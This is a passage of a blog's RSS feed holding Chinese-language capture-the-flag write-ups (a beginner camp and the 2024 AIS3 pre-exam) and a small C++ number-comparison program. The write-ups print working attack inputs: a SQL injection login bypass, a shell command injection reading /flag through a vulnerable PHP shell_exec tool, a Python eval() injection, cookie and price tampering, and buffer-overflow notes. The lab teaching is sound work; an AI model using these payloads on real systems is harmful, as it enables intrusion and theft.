</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Sat, 08 Jun 2024 14:11:59 GMT</pubDate></item><item><title>‰∏ÄÊó•Ë≥áË®äÈ´îÈ©óÁáüwriteup</title><link>https://yih-0118.github.io/blog/%E4%B8%80%E6%97%A5%E8%B3%87%E8%A8%8A%E9%AB%94%E9%A9%97%E7%87%9Fwriteup/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/%E4%B8%80%E6%97%A5%E8%B3%87%E8%A8%8A%E9%AB%94%E9%A9%97%E7%87%9Fwriteup/</guid><description>Á¨¨‰∏ÄÊ¨°Áï∂Âä©ÊïôÂ•ΩËààÂ•Æ</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/%E4%B8%80%E6%97%A5%E8%B3%87%E8%A8%8A%E9%AB%94%E9%A9%97%E7%87%9Fwriteup/&quot;&gt;https://yih-0118.github.io/blog/%E4%B8%80%E6%97%A5%E8%B3%87%E8%A8%8A%E9%AB%94%E9%A9%97%E7%87%9Fwriteup/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;welcome 0x1&lt;/h2&gt;
&lt;h3&gt;[‰ªäÊó•Á∞°Â†±]&lt;/h3&gt;
&lt;p&gt;ÊúÉÁôºÁèæÊúâÁµ¶‰Ω†‰∏ÄÂÄãpdfÊ™îÊ°à
ÈÇ£Â∞±ÊòØ
&lt;del&gt;ÂÖ∂ÂØ¶ÊòØË¨õÂ∏´Ë∑ëÈåØÂàÜÈÉ®
Á†¥Â§ßÊàø(Ôº∞Ôº§Ôº¶)&lt;/del&gt;
FLAGÔºö&lt;code&gt;PDF&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[welcome]&lt;/h3&gt;
&lt;p&gt;Â∞±ÊòØwelcome
&lt;img src=&quot;https://hackmd.io/_uploads/S1oGypcEC.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILEA{h3lLo_w0r1D}&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Linux 0x1&lt;/h2&gt;
&lt;h3&gt;[knock knock]&lt;/h3&gt;
&lt;p&gt;ÈÄ≤ÂéªÁúãÂà∞ÁõÆÈåÑ‰∏ãÈù¢Â∞±ÂèØ‰ª•‰∫Ü
LinuxÊåá‰ª§Ôºö&lt;code&gt;ls&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/BJvhkpcN0.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILEA{l5}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[meow meow]&lt;/h3&gt;
&lt;p&gt;LinuxÊåá‰ª§‰∏≠catÂ∞±ÊòØÊääÊ™îÊ°àÁöÑÊù±Êù±ÊñáÂ≠ó‰πãÈ°ûÁöÑËº∏Âá∫Âá∫‰æÜ
LinuxÊåá‰ª§Ôºö&lt;code&gt;cat flag&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SJ2-epcNC.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILEA{w3lc0Me_CtF_w0r1D}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[ninja file!]&lt;/h3&gt;
&lt;p&gt;È°åÁõÆË™™Êúâ‰∏ÄÂÄãÈö±ËóèÁöÑÊ™îÊ°àÔºå‰∏ÄËà¨ÁöÑ&lt;code&gt;ls&lt;/code&gt;Êåá‰ª§ÊòØÁÑ°Ê≥ïÂÆåÂÖ®È°ØÁ§∫Âá∫‰æÜÁöÑ
Ë¶ÅÁî®&lt;code&gt;ls -al&lt;/code&gt;ÊâÄÊúâÊù±Êù±ÈÉΩÂèØ‰ª•Âá∫‰æÜ
&lt;img src=&quot;https://hackmd.io/_uploads/HJaFeTqER.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILEA{shhhh......}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[ÊôÇÁ©∫Ë∑≥Ë∫ç]&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;../../../../../../../../../../../

Ë´ãÂïèÈÄôÊ®£ÂæÄÂâçË∑≥ÂπæÁöÑÁõÆÈåÑÔºü
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊúÉÁôºÁèæÊúâ11ÂÄã&lt;code&gt;/&lt;/code&gt;
ÊâÄ‰ª•
FLAG:&lt;code&gt;11&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[Ê¨äÈôêÈÅäÊà≤]&lt;/h3&gt;
&lt;p&gt;Áî®wget [Á∂≤ÂùÄ] -O [‰Ω†ÊÉ≥Ë¶ÅÁöÑÊ™îÊ°àÂêçÁ®±]
Ë¶ÅÊèêÂçáÊ¨äÈôêÁöÑË©±
&lt;code&gt;chmod +x [Ê™îÊ°àÂêçÁ®±]&lt;/code&gt;
&lt;code&gt;./Âü∑Ë°åÊ™îÊ°àÁöÑÊ™îÊ°à&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/H1UuWpcE0.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILEA{th1s_1s_6_f169}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[ËÄÉÂè§Â≠∏ÂÆ∂]&lt;/h3&gt;
&lt;p&gt;Ë¶ÅÊâæÂà∞‰∏ÄÂ§ßÁØáÊñáÁ´†‰∏≠ÁöÑÂπæÂÄãÁâπÂÆöÂ≠ó
ÂèØ‰ª•Ê≠§Áî®grepÊåá‰ª§
Áî®Ê≥ïÔºö&lt;code&gt;gerp [ÈóúÈçµÂ≠ó]&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/HkOlfac4R.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILEA{g00g1e.c0M3}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[h1de_4nD_s33k]&lt;/h3&gt;
&lt;p&gt;È°åÁõÆÂëäË®¥‰Ω†opt‰πã‰∏≠Êúâ‰∏ÄÂÄãÊ™îÊ°àÂè´ÂÅösecret
LinuxÊåá‰ª§Ôºö&lt;code&gt;find /opt secret&lt;/code&gt;
Áü•ÈÅìË∑ØÂæëÂæåÁõ¥Êé•catÂá∫‰æÜ
&lt;img src=&quot;https://hackmd.io/_uploads/SyDqG69VR.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILEA{U...c4Nt!f1nDm3!!!}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[Ê∞∏ÈÅ†‰∏çÊúÉÊîæÊ£ÑÔºÅ]&lt;/h3&gt;
&lt;p&gt;ncÊåá‰ª§ÔºöÂèØ‰ª•ÈÄ£Á∑öËá≥Ë©≤‰º∫ÊúçÂô®‰πãÈ°ûÁöÑ
Âú®ÈÄ£Á∑ö‰πãÂæå
ÊúÉÊúânever gonna give you up ÁöÑÂãïÁï´
Ë∑ëÂÆå‰πãÂæåÂ∞±Êúâ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/BJdQXacV0.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;111tttft11TILEA{n3v3r_g0nn6_g1v3_y0u_up}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[SUS service]&lt;/h3&gt;
&lt;p&gt;Áî®&lt;code&gt;netstat -an&lt;/code&gt;ÂéªÁúãÈÇ£ÂÄãÊúâ‰ªÄÈ∫ºÊúçÂãôÂú®Èñã
&lt;img src=&quot;https://hackmd.io/_uploads/Sy7Km6940.png&quot; alt=&quot;image&quot;&gt;
ÊúÉÁôºÁèæÊúâ‰∏ÄÂÄã:80
Â∞±‰ª£Ë°®Â∫ï‰∏ãÊúâ‰∏ÄÂÄãÁ∂≤È†ÅÂú®Ë∑ë
ÁÑ∂ÂæåÂ∞±Êúâ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/SyPCmTq4C.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILEA{Am0n9_5uS}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[ÈéñÂå†]&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkxb4a5VC.png&quot; alt=&quot;image&quot;&gt;
ÂÖ∂ÂØ¶ÊàëÂÄëÂè™Ë¶Å&lt;code&gt;strings&lt;/code&gt;‰∏Ä‰∏ãÂ∞±Âá∫‰æÜ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/H1HEN69N0.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILEA{t0d6y_w3ath3r_g00d}&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Crypto 0x1&lt;/h2&gt;
&lt;h3&gt;[Binary to ASCII]&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/S19vVa94A.png&quot; alt=&quot;image&quot;&gt;
‰∏üÂà∞ÈÄôÂÄãÁ∂≤È†ÅÂ∞±ÂèØ‰ª•ËΩâÊèõ‰∫Ü
&lt;a href=&quot;https://www.rapidtables.com/convert/number/binary-to-ascii.html&quot;&gt;https://www.rapidtables.com/convert/number/binary-to-ascii.html&lt;/a&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SJ5q46cNR.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILEA{th1s1sb1n6ry}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[Hex to ASCII]&lt;/h3&gt;
&lt;p&gt;‰∏üÂà∞ÈÄôÂÄãÁ∂≤È†ÅÂ∞±ÂèØ‰ª•‰∫Ü
&lt;a href=&quot;https://www.rapidtables.com/convert/number/hex-to-ascii.html&quot;&gt;https://www.rapidtables.com/convert/number/hex-to-ascii.html&lt;/a&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/ryYRV694A.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILEA{hect_or_tex}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[Base64]&lt;/h3&gt;
&lt;p&gt;==Base64ÊòØ‰∏ÄÁ®ÆÊ†ºÂºè==
&lt;a href=&quot;https://www.base64decode.org/&quot;&gt;Áî®ÈÄôÂÄãÁ∂≤È†ÅËß£&lt;/a&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SJizBT94A.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h3&gt;[Âá±Ëñ©Ê≤ôÊãâ]&lt;/h3&gt;
&lt;p&gt;ÈÄôÊòØÂá±Ëñ©ÂØÜÁ¢º
==ÈÄôÂ∞±ÊòØÂä†ÂØÜ‰∫Ü==
&lt;a href=&quot;https://www.dcode.fr/caesar-cipher&quot;&gt;https://www.dcode.fr/caesar-cipher&lt;/a&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/r1cPrTqE0.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILAE{caesar_salad_is_good_to_eat}&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;web 0x1&lt;/h2&gt;
&lt;h3&gt;[Ê©üÂô®‰∫∫ÈªûË∏¢ÂèâË∏¢]&lt;/h3&gt;
&lt;p&gt;ÂèØ‰ª•ÂéªÁúã‰∏ãÈù¢Êúâ‰ªÄÈ∫º
ÈÄ≤Âà∞&lt;code&gt;/robots.txt&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/BJyTBp54R.png&quot; alt=&quot;image&quot;&gt;
Â∞±Êúâ‰∫Ü
FLAG:&lt;code&gt;Disallow: /search/TILEA{r0b0ts_d0t_txt}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[Admin Panel]&lt;/h3&gt;
&lt;p&gt;ÊâìÈñãmagicÁúã‰∏Ä‰∏ã
Ê≠£Â∏∏ÁöÑsql injectionÁÑ°Ê≥ï
ÁõÆÊ®ôÊòØÊääpasswordË®ªÈáãÊéâ
&lt;img src=&quot;https://hackmd.io/_uploads/H1A7Lp940.png&quot; alt=&quot;image&quot;&gt;
ÈÄôÊ®£Â∞±ÂèØ‰ª•‰∫Ü
FLAG:&lt;code&gt;TILEA{OsGa&amp;#39; OR 1=1; -- #}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[Ë≤ìÂí™ÂïÜÂ∫ó]&lt;/h3&gt;
&lt;p&gt;ÊàëÂÄëÈúÄË¶ÅË≥ºË≤∑&lt;code&gt;FLAG&lt;/code&gt;‰ΩÜÊòØÈå¢Âèà‰∏çÂ§†Â§ö
ËÄå‰∏îÊ≤íÊúâÊåâÈàï
&lt;img src=&quot;https://hackmd.io/_uploads/Sk0OL69EA.png&quot; alt=&quot;image&quot;&gt;
ÂèØÁü•evil catÊòØ5431
ÈÇ£FLAGÂ∞±ÊòØÂú®5430ÁöÑÂú∞Êñπ
Âú®Ë≥ºË≤∑ÁöÑÊôÇÂÄôÊâæÂà∞input
‰øÆÊîπvauleÂ∞±Â•Ω
&lt;img src=&quot;https://hackmd.io/_uploads/r1DRLpq4R.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILEA{c4T_m30w_m30W}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[DNS Lookup Tool üîç]&lt;/h3&gt;
&lt;p&gt;ÊàëÊòØÂÖàÂéªÁúãÂéüÂßãÁ¢ºÁôºÁèæ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) and die(show_source(__FILE__, true));
?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;

&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;IE=edge&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;DNS Lookup Tool | Baby&amp;lt;/title&amp;gt;
    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css&amp;quot;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
    &amp;lt;section class=&amp;quot;section&amp;quot;&amp;gt;
        &amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt;
            &amp;lt;div class=&amp;quot;column is-6 is-offset-3 has-text-centered&amp;quot;&amp;gt;
                &amp;lt;div class=&amp;quot;box&amp;quot;&amp;gt;
                    &amp;lt;h1 class=&amp;quot;title&amp;quot;&amp;gt;DNS Lookup Tool üîç&amp;lt;/h1&amp;gt;
                    &amp;lt;form method=&amp;quot;POST&amp;quot;&amp;gt;
                        &amp;lt;div class=&amp;quot;field&amp;quot;&amp;gt;
                            &amp;lt;div class=&amp;quot;control&amp;quot;&amp;gt;
                                &amp;lt;input class=&amp;quot;input&amp;quot; type=&amp;quot;text&amp;quot; name=&amp;quot;name&amp;quot; placeholder=&amp;quot;example.com&amp;quot; id=&amp;quot;hostname&amp;quot; value=&amp;quot;&amp;lt;?= $_POST[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39; ?&amp;gt;&amp;quot;&amp;gt;
                            &amp;lt;/div&amp;gt;
                        &amp;lt;/div&amp;gt;
                        &amp;lt;button class=&amp;quot;button is-block is-info is-fullwidth&amp;quot;&amp;gt;
                            Lookup!
                        &amp;lt;/button&amp;gt;
                    &amp;lt;/form&amp;gt;
                    &amp;lt;br&amp;gt;
                    &amp;lt;?php if (isset($_POST[&amp;#39;name&amp;#39;])) : ?&amp;gt;
                        &amp;lt;section class=&amp;quot;has-text-left&amp;quot;&amp;gt;
                            &amp;lt;p&amp;gt;Lookup result:&amp;lt;/p&amp;gt;
                            &amp;lt;pre&amp;gt;&amp;lt;?= shell_exec(&amp;quot;host &amp;#39;&amp;quot; . $_POST[&amp;#39;name&amp;#39;] . &amp;quot;&amp;#39;;&amp;quot;) ?&amp;gt;&amp;lt;/pre&amp;gt;
                        &amp;lt;/section&amp;gt;
                    &amp;lt;?php endif; ?&amp;gt;
                    &amp;lt;hr&amp;gt;
                    &amp;lt;a id=&amp;quot;magic&amp;quot;&amp;gt;Magic&amp;lt;/a&amp;gt; | &amp;lt;a href=&amp;quot;/?source&amp;quot;&amp;gt;Source Code&amp;lt;/a&amp;gt;
                &amp;lt;/div&amp;gt;
                &amp;lt;article class=&amp;quot;message is-link is-hidden is-size-4&amp;quot; id=&amp;quot;hint&amp;quot;&amp;gt;
                    &amp;lt;div class=&amp;quot;message-body is-family-monospace&amp;quot;&amp;gt;
                        host &amp;#39;&amp;lt;span class=&amp;quot;has-text-danger&amp;quot; id=&amp;quot;command&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;#39;;
                    &amp;lt;/div&amp;gt;
                &amp;lt;/article&amp;gt;
            &amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
    &amp;lt;/section&amp;gt;

    &amp;lt;script&amp;gt;
        magic.onclick = () =&amp;gt; hint.classList.toggle(&amp;quot;is-hidden&amp;quot;);
        window.onload = hostname.oninput = () =&amp;gt; command.textContent = hostname.value;
    &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•Áî®$
ÁÑ∂ÂæåÂ∞éÂà∞ÊúâFLAGÁöÑÊù±Êù±Â∞±ÂèØ‰ª•‰∫Ü
Âú®Áî®catËº∏Âá∫Âá∫‰æÜ
Ëº∏ÂÖ•:&lt;code&gt;&amp;#39;$(cat /flag\*)&amp;#39;&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SJjDv65E0.png&quot; alt=&quot;image&quot;&gt;
FlAG:&lt;code&gt;TILEA{h4ck3R!c0mm3D!!}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;[cookie master]&lt;/h3&gt;
&lt;p&gt;ÂÖàÂú®InspectÊâæÂà∞Â∏≥ÂØÜ
&lt;img src=&quot;https://hackmd.io/_uploads/HJV3DpcNA.png&quot; alt=&quot;image&quot;&gt;
ÁôªÂÖ•ÂæåÁôºÁèæÊàëË¢´È®ô‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/rysTPTc4A.png&quot; alt=&quot;image&quot;&gt;
ÊàëÂÄëÈÄ≤ÂÖ•Âà∞application‰∏≠ÊääcookieÁöÑauth_methodÊîπÊàêÁ©∫ÂÄº
&lt;img src=&quot;https://hackmd.io/_uploads/SJXZ_p9NC.png&quot; alt=&quot;image&quot;&gt;
ÁÑ∂ÂæåÂà∑Êñ∞‰∏Ä‰∏ãÂ∞±Â•Ω‰∫Ü
ÁÑ∂ÂæåÂ∞±Âá∫‰æÜ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/B1y7KpqE0.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;TILEA{c00K1e_M4St3R}&lt;/code&gt;&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Mon, 03 Jun 2024 03:54:15 GMT</pubDate></item><item><title>Â§ßÊï∏ÊØîÂ§ßÂ∞è</title><link>https://yih-0118.github.io/blog/%E5%A4%A7%E6%95%B8%E6%AF%94%E5%A4%A7%E5%B0%8F/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/%E5%A4%A7%E6%95%B8%E6%AF%94%E5%A4%A7%E5%B0%8F/</guid><description>Â∞èËèúÈõûËÆìÊàëÂØ´ÁöÑ</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/%E5%A4%A7%E6%95%B8%E6%AF%94%E5%A4%A7%E5%B0%8F/&quot;&gt;https://yih-0118.github.io/blog/%E5%A4%A7%E6%95%B8%E6%AF%94%E5%A4%A7%E5%B0%8F/&lt;/a&gt;&lt;/blockquote&gt; &lt;ul&gt;
&lt;li&gt;Â§™ÁÑ°ËÅä&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkhA3HrEC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;#include&amp;lt;iostream&amp;gt;
#include&amp;lt;vector&amp;gt;
using namespace std;
int f(const vector&amp;lt;int&amp;gt;&amp;amp; a, const vector&amp;lt;int&amp;gt;&amp;amp; b) {
    if (a.size() &amp;lt; b.size()) return -1; 
    if (a.size() &amp;gt; b.size()) return 1;  
    for (int i = a.size() - 1; i &amp;gt;= 0; i--) {
        if (a[i] &amp;lt; b[i]) return -1; 
        if (a[i] &amp;gt; b[i]) return 1;
    }
    return 0;
}
int main(){
    string a, b;
    vector&amp;lt;int&amp;gt; a_int, b_int;
    cin &amp;gt;&amp;gt; a &amp;gt;&amp;gt; b;
    if (!a.empty()) {
        for(int i = a.size() - 1; i &amp;gt;= 0; i--){
            int digit = static_cast&amp;lt;int&amp;gt;(a[i]) - &amp;#39;0&amp;#39;;
            a_int.push_back(digit);
        }
    }
    if (!b.empty()) {
        for(int i = b.size() - 1; i &amp;gt;= 0; i--){
            int digit = static_cast&amp;lt;int&amp;gt;(b[i]) - &amp;#39;0&amp;#39;;
            b_int.push_back(digit);
        }
    }
    int cmp = f(a_int, b_int);
    if (cmp == -1)
        cout &amp;lt;&amp;lt; &amp;quot;&amp;lt;&amp;quot; &amp;lt;&amp;lt; endl;
    else if (cmp == 1)
        cout &amp;lt;&amp;lt; &amp;quot;&amp;gt;&amp;quot; &amp;lt;&amp;lt; endl;
    else
        cout &amp;lt;&amp;lt; &amp;quot;=&amp;quot; &amp;lt;&amp;lt; endl;
}
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Thu, 30 May 2024 01:13:04 GMT</pubDate></item><item><title>2024 AIS3 pre-exam</title><link>https://yih-0118.github.io/blog/2024ais3/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/2024ais3/</guid><description>pre-examÂ§ßÁáíÈõû</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/2024ais3/&quot;&gt;https://yih-0118.github.io/blog/2024ais3/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;[Welcome]&lt;/h2&gt;
&lt;p&gt;flagÂ∞±ÊîæÂú®È°åÁõÆË£°ÔºåÊàëÊ≤íÊúâÊà™‰∏ã‰æÜ&lt;/p&gt;
&lt;h2&gt;[Quantum Nim Heist]&lt;/h2&gt;
&lt;p&gt;ÊúÉÁôºÁèæÊòØ‰∏ÄÂÄãÂè´‰Ω†ÊãøÁü≥È†≠ÁöÑÈÅäÊà≤&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yih_0118@Macbook Downloads % nc chals1.ais3.org 40004
+-------------------- welcome --------------------+
| omg hi!                                         |
|                                                 |
| welcome to microchess, the minimal online chess |
| platform.                                       |
| i am a super powerful chess AI!                 |
| can you win against me and get the flag?        |
+---+--------------- main menu -------------------+
| 0 | read the rules of the game                  |
| 1 | start a new game against me                 |
| 2 | load a saved game                           |
| 3 | leave                                       |
+---+---------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êúâ‰∏ÄÂÄãÊäÄÂ∑ßÔºåÁï∂ÊãøÂà∞ÂÖ©ÂÄãÊ®ÅÂêÑÂâ©‰∏ÄÈ°ÜÔºåÁÑ∂ÂæåË∑ü‰ªñÂ•óÔºåË™íÊàëË¶ÅÊãøÁü≥È†≠‰ΩÜÊòØËº∏ÂÖ•ÂÄº‰∏ÄÁõ¥ÊòØ0&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;+---+-------------- stones info ------------------+
| 0 | o                                           |
| 1 | o                                           |
+---+--------------- game menu -------------------+
| 0 | make a move                                 |
| 1 | save the current game and leave             |
| 2 | resign the game                             |
+---+---------------------------------------------+
it&amp;#39;s your turn to move! what do you choose? 0
which pile do you choose? 0
how many stones do you remove? 0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÁÑ∂ÂæåÂÜçË©¶‰∏Ä‰∏ãÔºåÊàëÊØèÊ¨°Ëº∏ÂÖ•001Â∞±ÈÅé‰∫Ü&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;it&amp;#39;s your turn to move! what do you choose? 0
which pile do you choose? 0
how many stones do you remove? 1
+---------------- congratulations ----------------+
| you are a true grandmaster of chess! here is    |
| the flag for you:                               |
| AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}  |
+-------------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;[Three Dimensional Secret]&lt;/h2&gt;
&lt;p&gt;‰ªñÊúÉÁµ¶‰Ω†‰∏ÄÂÄãÁ∂≤Ë∑ØÂ∞ÅÂåÖÔºå‰∏üÂà∞wiresharkÂéªÁúãÁúã
streamÂá∫‰æÜÂæåÊúÉÁôºÁèæÂ•ΩÂÉèÊòØG-codeÁÑ∂ÂæåÂèØ‰ª•‰∏üÂà∞ÂÄãÁ∂≤Á´ô
&lt;img src=&quot;https://hackmd.io/_uploads/BJ4tRfEVR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ncviewer.com/&quot;&gt;Á∂≤È†ÅÈÄ£Áµê&lt;/a&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/H1M6RzE4R.png&quot; alt=&quot;image&quot;&gt;
Â∞±Âá∫‰æÜ‰∫Ü&lt;/p&gt;
&lt;h2&gt;[Evil Calculator]&lt;/h2&gt;
&lt;p&gt;ÁôºÁèæÊòØ‰∏ÄÂÄãÁ•ûÂ•áÁöÑË®àÁÆóÊ©ü
&lt;img src=&quot;https://hackmd.io/_uploads/BJBf8zEVA.png&quot; alt=&quot;image&quot;&gt;
ÂÅáÂ¶ÇÊàëÊåâ‰∏ã&lt;code&gt;1+1&lt;/code&gt;ÂÜçÊåâ‰∏ãÁ≠âÊñºÔºåÊàëÁî®burp suiteÂéªÊîîÊà™ÊúÉÁôºÁèæÊòØ‰∏ÄÂÄãjsonÊ†ºÂºèÁöÑÊù±Êù±
&lt;img src=&quot;https://hackmd.io/_uploads/Hkq2wfNVC.png&quot; alt=&quot;image&quot;&gt;
ÂéªÁúã‰∏Ä‰∏ã&lt;code&gt;app.js&lt;/code&gt;Ë£°Èù¢Êúâ‰ªÄÈ∫ºÊ¥ûÂèØ‰ª•ÈëΩ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;@app.route(&amp;#39;/calculate&amp;#39;, methods=[&amp;#39;POST&amp;#39;])
def calculate():
    data = request.json
    expression = data[&amp;#39;expression&amp;#39;].replace(&amp;quot; &amp;quot;,&amp;quot;&amp;quot;).replace(&amp;quot;_&amp;quot;,&amp;quot;&amp;quot;)
    try:
        result = eval(expression)
    except Exception as e:
        result = str(e)
    return jsonify(result=str(result))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÁôºÁèæÁî®eval()ÂèØ‰ª•ÂéªÈëΩÔºåÁõ¥Êé•Âá∫ÂÖ•Êåá‰ª§ÂéªÊ±ÇÂá∫flag
ÂèØ‰ª•‰ΩøÁî®burp suiteÁöÑrepeaterÂéªÁúãÂõûË¶Ü
&lt;img src=&quot;https://hackmd.io/_uploads/BJF1cfVVR.png&quot; alt=&quot;image&quot;&gt;
ÈÇ£ÊàëÂÄëÊääexpressionÊîπÊàê&lt;code&gt;&amp;quot;open(&amp;#39;/flag&amp;#39;, &amp;#39;r&amp;#39;).read()&amp;quot;&lt;/code&gt;
ÁÑ∂ÂæåÂ∞±Âá∫‰æÜ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/SJdR5M44C.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2&gt;[Mathter]&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJcMx0bEA.png&quot; alt=&quot;image&quot;&gt;
ÈÄ≤ÂéªgoodbyeÁúã‰∏Ä‰∏ã
&lt;img src=&quot;https://hackmd.io/_uploads/HJ2Bl0b4A.png&quot; alt=&quot;image&quot;&gt;
„ÑüÁ´üÁÑ∂ÊúâgetsÔºåÂèØ‰ª•overflow
ÁôºÁèæÊòØv1[4] ÊâÄ‰ª•Ë¶ÅÊâì12ÈÄ≤Âéª
&lt;img src=&quot;https://hackmd.io/_uploads/SkXS-0ZNC.png&quot; alt=&quot;image&quot;&gt;
ÊúâÂÖ©ÂÄãÁ•ûÂ•áÂáΩÊï∏ÔºåÁπûÈÄ≤ÂéªÂ•Ω‰∫Ü?
&lt;img src=&quot;https://hackmd.io/_uploads/HJKQkGNN0.png&quot; alt=&quot;image&quot;&gt;
ËßÄÂØü‰∏Ä‰∏ãwin1
ÁôºÁèæ-559038737ÊúÉÊòØ0xDEADBEEF
&lt;img src=&quot;https://hackmd.io/_uploads/BJ8rGzEEA.png&quot; alt=&quot;image&quot;&gt;
ËßÄÂØü‰∏Ä‰∏ãwin2
ÁôºÁèæ-889275714ÊúÉÊòØ0xcafebabe&lt;/p&gt;
